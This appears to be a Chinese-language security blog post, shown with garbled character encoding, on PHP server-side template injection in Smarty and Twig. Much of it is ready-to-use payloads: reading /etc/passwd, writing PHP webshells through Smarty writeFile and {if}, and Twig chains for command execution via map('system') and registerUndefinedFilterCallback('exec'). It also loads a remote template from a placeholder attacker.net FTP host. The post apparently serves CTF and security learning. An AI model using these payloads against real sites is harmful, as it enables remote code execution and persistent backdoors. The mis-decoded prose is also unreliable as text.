<h2 id="PHPæ¨¡æ¿æ³¨å…¥"><a href="#PHPæ¨¡æ¿æ³¨å…¥" class="headerlink" title="PHPæ¨¡æ¿æ³¨å…¥"></a>PHPæ¨¡æ¿æ³¨å…¥</h2><p>phpå¸¸è§çš„æ¨¡æ¿ï¼štwigï¼Œsmartyï¼Œblade</p>
<h3 id="Smarty"><a href="#Smarty" class="headerlink" title="Smarty"></a>Smarty</h3><p>PHPæ¨¡æ¿çš„é¼»ç¥–ï¼Œåæ¥çš„phpæ¨¡æ¿å¤§å¤šéƒ½æ˜¯åŸºäºå…¶å‘å±•èµ·æ¥çš„</p>
<p>åŸºæœ¬ç¡®å®šæŒ‡ä»¤</p>
<pre><code class="highlight php">&#123;<span class="variable">$smarty</span>.version&#125; <span class="comment">//æŸ¥çœ‹smartyçš„ç‰ˆæœ¬æ¥ç¡®å®šå§¿åŠ¿</span></code></pre>

<p>è¯´å®è¯ï¼Œsmartyçš„å§¿åŠ¿è¿˜æ˜¯è›®å¤šçš„ï¼Œå…ˆç»™ä¸‰ç§æ¯”è¾ƒå¸¸è§çš„å§</p>
<ul>
<li><p>åŸºäºXFFçš„æ™®é€šæ³¨å…¥:åœ¨{}å†…ç–¯ç‹‚è¾“å‡º</p>
</li>
<li><p>åˆ©ç”¨{include}æ¥ä»»æ„æ–‡ä»¶è¯»å–ï¼›string:{include file&#x3D;â€™D:\flag.txtâ€™}è¿™æ—¶æ–‡æœ¬å†…å®¹å°±è¢«è¯»å–äº†</p>
</li>
</ul>
<h4 id="é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•"><a href="#é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•" class="headerlink" title="é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•"></a><strong>é€šè¿‡selfè·å–Smartyç±»å†è°ƒç”¨å…¶é™æ€æ–¹æ³•</strong></h4><p><strong>getStreamVariable:</strong></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getStreamVariable</span>(<span class="params"><span class="variable">$variable</span></span>)//<span class="title">variable</span>å…¶å®å°±æ˜¯æ–‡ä»¶è·¯å¾„</span>
<span class="function"></span>&#123;
        <span class="variable">$_result</span> = <span class="string">&#x27;&#x27;</span>;
        <span class="variable">$fp</span> = <span class="title function_ invoke__">fopen</span>(<span class="variable">$variable</span>, <span class="string">&#x27;r+&#x27;</span>);<span class="comment">//ä»æ­¤å¤„å¼€å§‹å¯¹æ–‡ä»¶è¿›è¡Œè¯»å–</span>
        <span class="keyword">if</span> (<span class="variable">$fp</span>) &#123;
            <span class="keyword">while</span> (!<span class="title function_ invoke__">feof</span>(<span class="variable">$fp</span>) &amp;&amp; (<span class="variable">$current_line</span> = <span class="title function_ invoke__">fgets</span>(<span class="variable">$fp</span>)) !== <span class="literal">false</span>) &#123;
                <span class="variable">$_result</span> .= <span class="variable">$current_line</span>;
            &#125;
            <span class="title function_ invoke__">fclose</span>(<span class="variable">$fp</span>);
            <span class="keyword">return</span> <span class="variable">$_result</span>;
        &#125;
        <span class="variable">$smarty</span> = <span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;smarty) ? <span class="variable language_">$this</span>-&gt;smarty : <span class="variable language_">$this</span>;
        <span class="keyword">if</span> (<span class="variable">$smarty</span>-&gt;error_unassigned) &#123;
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&#x27;Undefined stream variable &quot;&#x27;</span> . <span class="variable">$variable</span> . <span class="string">&#x27;&quot;&#x27;</span>);
        &#125; <span class="keyword">else</span> &#123;
            <span class="keyword">return</span> <span class="literal">null</span>;
        &#125;
    &#125;
<span class="comment">//å¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•å¯ä»¥è¯»å–ä¸€ä¸ªæ–‡ä»¶å¹¶è¿”å›å…¶å†…å®¹ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ç”¨selfæ¥è·å–Smartyå¯¹è±¡å¹¶è°ƒç”¨è¿™ä¸ªæ–¹æ³•</span>
smarty/libs/sysplugins/smarty_internal_data.phpã€€ã€€â€”â€”&gt;ã€€ã€€<span class="title function_ invoke__">getStreamVariable</span>() è¿™ä¸ªæ–¹æ³•å¯ä»¥è·å–ä¼ å…¥å˜é‡çš„æµ
ä¾‹å¦‚ï¼š
&#123;<span class="built_in">self</span>::<span class="title function_ invoke__">getStreamVariable</span>(<span class="string">&quot;file:///etc/passwd&quot;</span>)&#125;</code></pre>

<p>payloadå½¢å¦‚ï¼š<code>&#123;self::getStreamVariable(â€œfile:///etc/passwdâ€)&#125;</code> &#x2F;&#x2F;åœ¨v3.1.30é€€å‡ºå†å²èˆå°</p>
<p><strong>writeFileï¼š</strong></p>
<p>è¿™ä¸ªä¸æ˜¯å¾ˆæ‡‚ï¼Œç›´æ¥å¼•ç”¨è¿™ä¸ªå¤§ä½¬çš„åšå®¢å§</p>
<p><img src="https://kisakiayano.oss-cn-hangzhou.aliyuncs.com/img/image-20250307213236244.png" alt="image-20250307213236244"></p>
<pre><code class="highlight php"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">writeFile</span>(<span class="params"><span class="variable">$_filepath</span>, <span class="variable">$_contents</span>, Smarty <span class="variable">$smarty</span></span>)</span>
<span class="function">    </span>&#123;
        <span class="variable">$_error_reporting</span> = <span class="title function_ invoke__">error_reporting</span>();
        <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span> &amp; ~E_NOTICE &amp; ~E_WARNING);
        <span class="variable">$_file_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_file_perms&#x27;</span>) ? <span class="variable">$smarty</span>-&gt;_file_perms : <span class="number">0644</span>;
        <span class="variable">$_dir_perms</span> = <span class="title function_ invoke__">property_exists</span>(<span class="variable">$smarty</span>, <span class="string">&#x27;_dir_perms&#x27;</span>) ? (<span class="keyword">isset</span>(<span class="variable">$smarty</span>-&gt;_dir_perms) ? <span class="variable">$smarty</span>-&gt;_dir_perms : <span class="number">0777</span>)  : <span class="number">0771</span>;
        <span class="keyword">if</span> (<span class="variable">$_file_perms</span> !== <span class="literal">null</span>) &#123;
            <span class="variable">$old_umask</span> = <span class="title function_ invoke__">umask</span>(<span class="number">0</span>);
        &#125;

        <span class="variable">$_dirpath</span> = <span class="title function_ invoke__">dirname</span>(<span class="variable">$_filepath</span>);
        <span class="comment">// if subdirs, create dir structure</span>
        <span class="keyword">if</span> (<span class="variable">$_dirpath</span> !== <span class="string">&#x27;.&#x27;</span> &amp;&amp; !<span class="title function_ invoke__">file_exists</span>(<span class="variable">$_dirpath</span>)) &#123;
            <span class="title function_ invoke__">mkdir</span>(<span class="variable">$_dirpath</span>, <span class="variable">$_dir_perms</span>, <span class="literal">true</span>);
        &#125;

        <span class="comment">// write to tmp file, then move to overt file lock race condition</span>
        <span class="variable">$_tmp_file</span> = <span class="variable">$_dirpath</span> . DS . <span class="title function_ invoke__">str_replace</span>(<span class="keyword">array</span>(<span class="string">&#x27;.&#x27;</span>, <span class="string">&#x27;,&#x27;</span>), <span class="string">&#x27;_&#x27;</span>, <span class="title function_ invoke__">uniqid</span>(<span class="string">&#x27;wrt&#x27;</span>, <span class="literal">true</span>));
        <span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>æˆ‘ä»¬åœ¨å¾€ä¸Šé¢çœ‹ï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªæ–¹æ³•æ˜¯åœ¨<code>class Smarty_Internal_Runtime_WriteFile</code>ä¸‹çš„ï¼Œ</p>
<p>æˆ‘ä»¬æ³¨æ„çœ‹è¿™æ®µä»£ç </p>
<pre><code class="highlight php"><span class="keyword">if</span> (!<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$_tmp_file</span>, <span class="variable">$_contents</span>)) &#123;
            <span class="title function_ invoke__">error_reporting</span>(<span class="variable">$_error_reporting</span>);
            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">SmartyException</span>(<span class="string">&quot;unable to write file <span class="subst">&#123;$_tmp_file&#125;</span>&quot;</span>);
       &#125;</code></pre>

<p>è¿™æ®µä»£ç å°†æ–‡ä»¶å†…å®¹å†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œå¦‚æœå†™å…¥å¤±è´¥ï¼Œåˆ™æ¢å¤å…ˆå‰çš„é”™è¯¯æŠ¥å‘Šçº§åˆ«ï¼Œå¹¶æŠ›å‡ºå¼‚å¸¸ã€‚</p>
<p>è¿™é‡Œçš„å…·ä½“è§£é‡Šæˆ‘ä¼šåœ¨ä¸‹é¢çš„CVE-2017-1000480å…·ä½“è®²åˆ°ï¼Œå…ˆæŒ–ä¸ªå‘ï¼Œè¿™é‡Œå†™å…¥ä¸´æ—¶æ–‡ä»¶ï¼Œåœ¨loadCompiledTemplateå‡½æ•°ä¸‹ï¼Œå­˜åœ¨è¯­å¥</p>
<pre><code class="highlight php"><span class="keyword">eval</span>(<span class="string">&quot;?&gt;&quot;</span> . <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$this</span>-&gt;filepath));</code></pre>

<p>å°±æœ‰äº†</p>
<pre><code class="highlight php">&#123;<span class="title class_">Smarty_Internal_Write_File</span>::<span class="title function_ invoke__">writeFile</span>(<span class="variable">$SCRIPT_NAME</span>,<span class="string">&quot;&lt;?php passthru(<span class="subst">$_GET</span>[&#x27;cmd&#x27;]); ?&gt;&quot;</span>,<span class="built_in">self</span>::<span class="title function_ invoke__">clearConfig</span>())&#125;</code></pre>

<p>æˆ‘ä»¬å°†<code>&lt;?php passthru($_GET[&#39;cmd&#39;]); ?&gt;</code>å†™å…¥äº†ä¸´æ—¶phpæ–‡ä»¶ä¸­</p>
<p><code>self::clearConfig()</code> æ˜¯ä¸€ä¸ª Smarty å†…éƒ¨æ–¹æ³•ï¼Œç”¨äºæ¸…é™¤æ¨¡æ¿å¼•æ“çš„é…ç½®é€‰é¡¹ã€‚</p>
<p><code>$SCRIPT_NAME</code> æ˜¯ä¸€ä¸ªåœ¨ PHP ä¸­é¢„å®šä¹‰çš„å˜é‡ï¼Œç”¨äºè¡¨ç¤ºå½“å‰æ‰§è¡Œè„šæœ¬çš„æ–‡ä»¶è·¯å¾„å’Œåç§°ã€‚</p>
<p>ä½†æ˜¯writeFileæ–¹æ³•ä¹Ÿæœ‰ç‰ˆæœ¬é™åˆ¶ï¼Œæ‰€ä»¥æˆ‘ä»¬é¦–å…ˆè¦ç¡®å®šæ¨¡æ¿çš„ç‰ˆæœ¬ï¼Œå†å†³å®šå¯¹åº”çš„æ”»å‡»æ–¹æ³•ã€‚</p>
<h4 id="æ ‡ç­¾"><a href="#æ ‡ç­¾" class="headerlink" title="æ ‡ç­¾:"></a>æ ‡ç­¾:</h4><p><strong>{$smarty.version}</strong></p>
<p>è·å–smartyçš„ç‰ˆæœ¬ä¿¡æ¯</p>
<p><strong>{literal}</strong></p>
<p>æ­¤æ ‡ç­¾çš„åˆ©ç”¨æ–¹æ³•ä»…ä»…æ˜¯åœ¨php5.xçš„ç‰ˆæœ¬ä¸­æ‰å¯ä»¥ä½¿ç”¨ï¼Œå› ä¸ºåœ¨ PHP5 ç¯å¢ƒä¸‹å­˜åœ¨ä¸€ç§ PHP æ ‡ç­¾ï¼Œ <code>&lt;script&gt;language=&quot;php&quot;&gt;&lt;/script&gt;ï¼Œ</code>æˆ‘ä»¬ä¾¿å¯ä»¥åˆ©ç”¨è¿™ä¸€æ ‡ç­¾è¿›è¡Œä»»æ„çš„ PHP ä»£ç æ‰§è¡Œã€‚ä½†æ˜¯åœ¨php7çš„ç‰ˆæœ¬ä¸­<code>&#123;literal&#125;xxxx;&#123;/literal&#125;</code>æ ‡ç­¾ä¸­é—´çš„å†…å®¹å°±ä¼šè¢«åŸå°ä¸åŠ¨çš„è¾“å‡ºï¼Œå¹¶ä¸ä¼šè§£æã€‚</p>
<p>ä½œç”¨ï¼š{literal} å¯ä»¥è®©ä¸€ä¸ªæ¨¡æ¿åŒºåŸŸçš„å­—ç¬¦åŸæ ·è¾“å‡ºã€‚è¿™ç»å¸¸ç”¨äºä¿æŠ¤é¡µé¢ä¸Šçš„Javascriptæˆ–cssæ ·å¼è¡¨ï¼Œé¿å…å› ä¸º Smarty çš„å®šç•Œç¬¦è€Œé”™è¢«è§£æã€‚</p>
<p>æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥åˆ©ç”¨å…¶çš„ä½œç”¨æ¥è¿›è¡Œxssæ”»å‡»SSTIç­‰æ¼æ´åˆ©ç”¨ã€‚</p>
<pre><code class="highlight php">&#123;literal&#125;&lt;script&gt;language=<span class="string">&quot;php&quot;</span>&gt;xxx&lt;/script&gt;;&#123;/literal&#125;</code></pre>

<p><strong>{php}{&#x2F;php}</strong></p>
<p>ç”¨äºæ‰§è¡Œphpä»£ç </p>
<pre><code class="highlight php">&#123;php&#125;<span class="title function_ invoke__">phpinfo</span>();&#123;/php&#125;</code></pre>

<p>ä½†æ˜¯è¿™ä¸ªæ–¹æ³•åœ¨Smarty3ç‰ˆæœ¬ä¸­å·²ç»è¢«ç¦ç”¨äº†ï¼Œä¸è¿‡å¤šèµ˜è¿°äº†ã€‚</p>
<p><strong>{if}{&#x2F;if}</strong></p>
<pre><code class="highlight php">&#123;<span class="keyword">if</span> <span class="title function_ invoke__">phpinfo</span>()&#125;&#123;/<span class="keyword">if</span>&#125;
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">system</span>(<span class="string">&#x27;cat /flag&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;
<span class="comment">//Smartyçš„&#123;if&#125;æ¡ä»¶åˆ¤æ–­å’ŒPHPçš„iféå¸¸ç›¸ä¼¼ï¼Œåªæ˜¯å¢åŠ äº†ä¸€äº›ç‰¹æ€§ã€‚æ¯ä¸ª&#123;if&#125;å¿…é¡»æœ‰ä¸€ä¸ªé…å¯¹çš„&#123;/if&#125;ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨&#123;else&#125; å’Œ &#123;elseif&#125;ï¼Œå…¨éƒ¨çš„PHPæ¡ä»¶è¡¨è¾¾å¼å’Œå‡½æ•°éƒ½å¯ä»¥åœ¨ifå†…ä½¿ç”¨ï¼Œå¦‚||*, or, &amp;&amp;, and, is_array(), ç­‰ç­‰ï¼Œå¦‚ï¼š&#123;if is_array($array)&#125;&#123;/if&#125;*</span>
&#123;<span class="keyword">if</span> <span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/shell.php&#x27;</span>,<span class="string">&#x27;&lt;?php eval($_POST[cmd]);&#x27;</span>)&#125;&#123;/<span class="keyword">if</span>&#125;</code></pre>

<h3 id="twig"><a href="#twig" class="headerlink" title="twig"></a>twig</h3><h4 id="è¯­æ³•ç»“æ„-1"><a href="#è¯­æ³•ç»“æ„-1" class="headerlink" title="è¯­æ³•ç»“æ„"></a>è¯­æ³•ç»“æ„</h4><p>æœ‰ä¸¤ç§å½¢å¼çš„åˆ†éš”ç¬¦ï¼š<code>&#123;% ... %&#125;</code> å’Œ <code>&#123;&#123; ... &#125;&#125;</code>ã€‚å‰è€…ç”¨äºæ‰§è¡Œè¯­å¥ï¼Œä¾‹å¦‚ <code>for</code> å¾ªç¯ï¼Œåè€…ç”¨äºå°†è¡¨è¾¾å¼çš„ç»“æœè¾“å‡ºåˆ°æ¨¡æ¿ä¸­ã€‚</p>
<p>åº”ç”¨ç¨‹åºå°†å˜é‡ä¼ å…¥æ¨¡æ¿ä¸­è¿›è¡Œå¤„ç†ï¼Œå˜é‡å¯ä»¥åŒ…å«ä½ èƒ½è®¿é—®çš„å±æ€§æˆ–å…ƒç´ ã€‚ä½ å¯ä»¥ä½¿ç”¨ <code>.</code> æ¥è®¿é—®å˜é‡ä¸­çš„å±æ€§ï¼ˆæ–¹æ³•æˆ– PHP å¯¹è±¡çš„å±æ€§ï¼Œæˆ– PHP æ•°ç»„å•å…ƒï¼‰ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨æ‰€è°“çš„ â€œsubscriptâ€ è¯­æ³• <code>[]</code>:</p>
<pre><code class="highlight plaintext">&#123;&#123; foo.bar &#125;&#125;
&#123;&#123; foo[&#x27;bar&#x27;] &#125;&#125;</code></pre>

<p><strong>è®¾ç½®å˜é‡</strong></p>
<p>ä¸ºæ¨¡å—ä»£ç å†…å˜é‡èµ‹å€¼æ—¶ä½¿ç”¨<code>set</code>æ ‡ç­¾</p>
<pre><code class="highlight plaintext">&#123;% set foo = &#x27;foo&#x27; %&#125;
&#123;% set foo = [1, 2] %&#125;
&#123;% set foo = &#123;&#x27;foo&#x27;: &#x27;bar&#x27;&#125; %&#125;</code></pre>

<p><strong>è¿‡æ»¤å™¨</strong></p>
<p>twigè¿˜æä¾›äº†è¿‡æ»¤å™¨æ¥ä¿®æ”¹æ¨¡æ¿ä¸­çš„å˜é‡ã€‚åœ¨è¿‡æ»¤å™¨ä¸­ï¼Œå˜é‡ä¸ä¸€ä¸ªæˆ–å¤šä¸ªè¿‡æ»¤å™¨é—´ä½¿ç”¨|åˆ†éš”ï¼Œè¿˜å¯ä»¥åœ¨æ‹¬å·ä¸­åŠ å…¥å¯é€‰å‚æ•°ã€‚å¯ä»¥è¿æ¥å¤šä¸ªè¿‡æ»¤å™¨ï¼Œä¸€ä¸ªè¿‡æ»¤å™¨çš„è¾“å‡ºç»“æœå°†ç”¨äºä¸‹ä¸€ä¸ªè¿‡æ»¤å™¨ä¸­ã€‚</p>
<p>ä¸‹é¢è¿™ä¸ªè¿‡æ»¤å™¨çš„ä¾‹å­ä¼šå‰¥å»å­—ç¬¦ä¸²å˜é‡ <code>name</code> ä¸­çš„ HTML æ ‡ç­¾ï¼Œç„¶åå°†å…¶è½¬åŒ–ä¸ºå¤§å†™å­—æ¯å¼€å¤´çš„æ ¼å¼:</p>
<pre><code class="highlight plaintext">&#123;&#123; name|striptags|title &#125;&#125;

// &#123;&#123; &#x27;&lt;a&gt;whoami&lt;a&gt;&#x27;|striptags|title &#125;&#125;
// Output: Whoami!</code></pre>

<p>ä¸‹é¢è¿™ä¸ªè¿‡æ»¤å™¨å°†æ¥æ”¶ä¸€ä¸ªåºåˆ— <code>list</code>ï¼Œç„¶åä½¿ç”¨ <code>join</code> ä¸­æŒ‡å®šçš„åˆ†éš”ç¬¦å°†åºåˆ—ä¸­çš„é¡¹åˆå¹¶æˆä¸€ä¸ªå­—ç¬¦ä¸²ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123; list|join &#125;&#125;
&#123;&#123; list|join(&#x27;, &#x27;) &#125;&#125;

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join &#125;&#125;
// Output: abc

// &#123;&#123; [&#x27;a&#x27;, &#x27;b&#x27;, &#x27;c&#x27;]|join(&#x27;|&#x27;) &#125;&#125;
// Output: a|b|c</code></pre>

<p><strong>å‡½æ•°</strong></p>
<p>åœ¨ Twig æ¨¡æ¿ä¸­å¯ä»¥ç›´æ¥è°ƒç”¨å‡½æ•°ï¼Œç”¨äºç”Ÿäº§å†…å®¹ã€‚å¦‚ä¸‹è°ƒç”¨äº† <code>range()</code> å‡½æ•°ç”¨æ¥è¿”å›ä¸€ä¸ªåŒ…å«æ•´æ•°ç­‰å·®æ•°åˆ—çš„åˆ—è¡¨ï¼š</p>
<pre><code class="highlight plaintext">&#123;% for i in range(0, 3) %&#125;
    &#123;&#123; i &#125;&#125;,
&#123;% endfor %&#125;

// Output: 0, 1, 2, 3,</code></pre>

<p><strong>å¼•å…¥å…¶ä»–æ¨¡æ¿</strong></p>
<p>Twig æä¾›çš„ <code>include</code> å‡½æ•°å¯ä»¥ä½¿ä½ æ›´æ–¹ä¾¿åœ°åœ¨æ¨¡æ¿ä¸­å¼•å…¥æ¨¡æ¿ï¼Œå¹¶å°†è¯¥æ¨¡æ¿å·²æ¸²æŸ“åçš„å†…å®¹è¿”å›åˆ°å½“å‰æ¨¡æ¿ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123; include(&#x27;sidebar.html&#x27;) &#125;&#125;</code></pre>

<h4 id="æ³¨å…¥"><a href="#æ³¨å…¥" class="headerlink" title="æ³¨å…¥"></a>æ³¨å…¥</h4><h5 id="Twig-1-x"><a href="#Twig-1-x" class="headerlink" title="Twig 1.x"></a>Twig 1.x</h5><p>åœ¨ Twig 1.x ä¸­å­˜åœ¨ä¸‰ä¸ªå…¨å±€å˜é‡ï¼š</p>
<ul>
<li><code>_self</code>ï¼šå¼•ç”¨å½“å‰æ¨¡æ¿çš„å®ä¾‹ã€‚</li>
<li><code>_context</code>ï¼šå¼•ç”¨å½“å‰ä¸Šä¸‹æ–‡ã€‚</li>
<li><code>_charset</code>ï¼šå¼•ç”¨å½“å‰å­—ç¬¦é›†ã€‚</li>
</ul>
<p>å¯¹åº”çš„ä»£ç æ˜¯ï¼š</p>
<pre><code class="highlight plaintext">protected $specialVars = [
        &#x27;_self&#x27; =&gt; &#x27;$this&#x27;,
        &#x27;_context&#x27; =&gt; &#x27;$context&#x27;,
        &#x27;_charset&#x27; =&gt; &#x27;$this-&gt;env-&gt;getCharset()&#x27;,
    ];</code></pre>

<p>è¿™é‡Œä¸»è¦å°±æ˜¯åˆ©ç”¨ <code>_self</code> å˜é‡ï¼Œå®ƒä¼šè¿”å›å½“å‰ <code>\Twig\Template</code> å®ä¾‹ï¼Œå¹¶æä¾›äº†æŒ‡å‘ <code>Twig_Environment</code> çš„ <code>env</code> å±æ€§ï¼Œè¿™æ ·æˆ‘ä»¬å°±å¯ä»¥ç»§ç»­è°ƒç”¨ <code>Twig_Environment</code> ä¸­çš„å…¶ä»–æ–¹æ³•ï¼Œä»è€Œè¿›è¡Œ SSTIã€‚</p>
<p>æ¯”å¦‚ä»¥ä¸‹ Payload å¯ä»¥è°ƒç”¨ <code>setCache</code> æ–¹æ³•æ”¹å˜ Twig åŠ è½½ PHP æ–‡ä»¶çš„è·¯å¾„ï¼Œåœ¨ <code>allow_url_include</code> å¼€å¯çš„æƒ…å†µä¸‹æˆ‘ä»¬å¯ä»¥é€šè¿‡æ”¹å˜è·¯å¾„å®ç°è¿œç¨‹æ–‡ä»¶åŒ…å«ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.setCache(&quot;ftp://attacker.net:2121&quot;)&#125;&#125;&#123;&#123;_self.env.loadTemplate(&quot;backdoor&quot;)&#125;&#125;</code></pre>

<p>æ­¤å¤–è¿˜æœ‰ <code>getFilter</code> æ–¹æ³•ï¼š</p>
<pre><code class="highlight plaintext">public function getFilter($name)
  &#123;
    ...
    foreach ($this-&gt;filterCallbacks as $callback) &#123;
    if (false !== $filter = call_user_func($callback, $name)) &#123;
      return $filter;
    &#125;
  &#125;
  return false;
&#125;

public function registerUndefinedFilterCallback($callable)
&#123;
  $this-&gt;filterCallbacks[] = $callable;
&#125;</code></pre>

<p>æˆ‘ä»¬åœ¨ <code>getFilter</code> é‡Œå‘ç°äº†å±é™©å‡½æ•° <code>call_user_func</code>ã€‚é€šè¿‡ä¼ é€’å‚æ•°åˆ°è¯¥å‡½æ•°ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„ PHP å‡½æ•°ã€‚Payload å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">&#123;&#123;_self.env.registerUndefinedFilterCallback(&quot;exec&quot;)&#125;&#125;&#123;&#123;_self.env.getFilter(&quot;id&quot;)&#125;&#125;
// Output: uid=33(www-data) gid=33(www-data) groups=33(www-data)</code></pre>

<p>ä½†æ˜¯åœ¨ Twig 2.x åŠ Twig 3.x ä»¥åï¼Œ<code>_self</code> çš„ä½œç”¨å‘ç”Ÿäº†å˜åŒ–ï¼Œåªèƒ½è¿”å›å½“å‰å®ä¾‹åå­—ç¬¦ä¸²ï¼š</p>
<h5 id="Twig-2-x-3-x"><a href="#Twig-2-x-3-x" class="headerlink" title="Twig 2.x &#x2F; 3.x"></a>Twig 2.x &#x2F; 3.x</h5><p>åˆ°äº† Twig 2.x &#x2F; 3.x ç‰ˆæœ¬ä¸­ï¼Œ<code>__self</code> å˜é‡åœ¨ SSTI ä¸­æ—©å·²å¤±å»äº†ä»–çš„ä½œç”¨ï¼Œä½†æˆ‘ä»¬å¯ä»¥å€ŸåŠ©æ–°ç‰ˆæœ¬ä¸­çš„ä¸€äº›è¿‡æ»¤å™¨å®ç°æ”»å‡»ç›®çš„ã€‚</p>
<p><strong>map</strong></p>
<p>è¿›è¡Œä¸€ä¸ªæ˜ å°„å…³ç³»</p>
<pre><code class="highlight plaintext">map è¿‡æ»¤å™¨å°†ç®­å¤´å‡½æ•°åº”ç”¨äºåºåˆ—æˆ–æ˜ å°„çš„å…ƒç´ ã€‚ç®­å¤´å‡½æ•°æ¥æ”¶åºåˆ—æˆ–æ˜ å°„çš„å€¼

&#123;% set people = [
    &#123;first: &quot;Bob&quot;, last: &quot;Smith&quot;&#125;,
    &#123;first: &quot;Alice&quot;, last: &quot;Dupond&quot;&#125;,
] %&#125;

&#123;&#123; people|map(p =&gt; &quot;#&#123;p.first&#125; #&#123;p.last&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
ç®­å¤´å‡½æ•°è¿˜å°†é”®ä½œä¸ºç¬¬äºŒä¸ªå‚æ•°æ¥æ”¶

&#123;% set people = &#123;
    &quot;Bob&quot;: &quot;Smith&quot;,
    &quot;Alice&quot;: &quot;Dupond&quot;,
&#125; %&#125;

&#123;&#123; people|map((value, key) =&gt; &quot;#&#123;key&#125; #&#123;value&#125;&quot;)|join(&#x27;, &#x27;) &#125;&#125;
&#123;# outputs Bob Smith, Alice Dupond #&#125;
è¯·æ³¨æ„ï¼Œç®­å¤´å‡½æ•°å¯ä»¥è®¿é—®å½“å‰ä¸Šä¸‹æ–‡ã€‚</code></pre>

<p>ä¹Ÿå°±æ˜¯è¯´å½“æˆ‘ä»¬ä½¿ç”¨<code>map</code>æ—¶</p>
<p><code>&#123;&#123;["Mark"]|map((arg)=>"Hello #&#123;arg&#125;!")&#125;&#125;</code>ä¼šè¢«ç¼–è¯‘æˆ<code>twig_array_map([0 =&gt; &quot;Mark&quot;], function ($__arg__) use ($context, $macros) &#123; $context[&quot;arg&quot;] = $__arg__; return (&quot;hello &quot; . ($context[&quot;arg&quot;] ?? null))&#125;)</code></p>
<p>è¿™ä¸ª <code>twig_array_map</code> å‡½æ•°çš„æºç å¦‚ä¸‹ï¼š</p>
<pre><code class="highlight plaintext">function twig_array_map($array, $arrow)
&#123;
    $r = [];
    foreach ($array as $k =&gt; $v) &#123;
        $r[$k] = $arrow($v, $k);    // ç›´æ¥å°† $arrow å½“åšå‡½æ•°æ‰§è¡Œ
    &#125;

    return $r;
&#125;</code></pre>

<p>ä»ä¸Šé¢çš„ä»£ç æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä¼ å…¥çš„ <code>$arrow</code> ç›´æ¥å°±è¢«å½“æˆå‡½æ•°æ‰§è¡Œï¼Œå³ <code>$arrow($v, $k)</code>ï¼Œè€Œ <code>$v</code> å’Œ <code>$k</code> åˆ†åˆ«æ˜¯ <code>$array</code> ä¸­çš„ value å’Œ keyã€‚<code>$array</code> å’Œ <code>$arrow</code> éƒ½æ˜¯æˆ‘ä»¬æˆ‘ä»¬å¯æ§çš„ï¼Œé‚£æˆ‘ä»¬å¯ä»¥ä¸ä¼ ç®­å¤´å‡½æ•°ï¼Œç›´æ¥ä¼ ä¸€ä¸ªå¯ä¼ å…¥ä¸¤ä¸ªå‚æ•°çš„ã€èƒ½å¤Ÿå‘½ä»¤æ‰§è¡Œçš„å±é™©å‡½æ•°åå³å¯å®ç°å‘½ä»¤æ‰§è¡Œ</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;id&quot;]|map(&quot;system&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;passthru&quot;)&#125;&#125;
&#123;&#123;[&quot;id&quot;]|map(&quot;exec&quot;)&#125;&#125;    // æ— å›æ˜¾</code></pre>

<p>å¦‚æœå‡½æ•°è¢«ç¦æ­¢äº†ä¹Ÿå¯ä»¥é€šè¿‡å†™é©¬æ¥è¿›è¡ŒRCE</p>
<pre><code class="highlight plaintext">&#123;&#123;[&quot;phpinfo();&quot;]|map(&quot;assert&quot;)|join(&quot;,&quot;)&#125;&#125;
&#123;&#123;&#123;&quot;&lt;?php phpinfo();eval($_POST[whoami])&quot;:&quot;/var/www/html/shell.php&quot;&#125;|map(&quot;file_put_contents&quot;)&#125;&#125;    // å†™ Webshell</code></pre>

<p><strong>sort</strong></p>
<p>è¿™ä¸ª <code>sort</code> ç­›é€‰å™¨å¯ä»¥ç”¨æ¥å¯¹æ•°ç»„æ’åºã€‚</p>
<pre><code class="highlight plaintext">&#123;% for user in users|sort %&#125;
    ...
&#123;% endfor %&#125;</code></pre>

<p>å¯ä»¥ä¼ é€’ä¸€ä¸ªç®­å¤´å‡½æ•°æ¥é…ç½®æ’åº</p>
<pre><code class="highlight plaintext">&#123;% set fruits = [
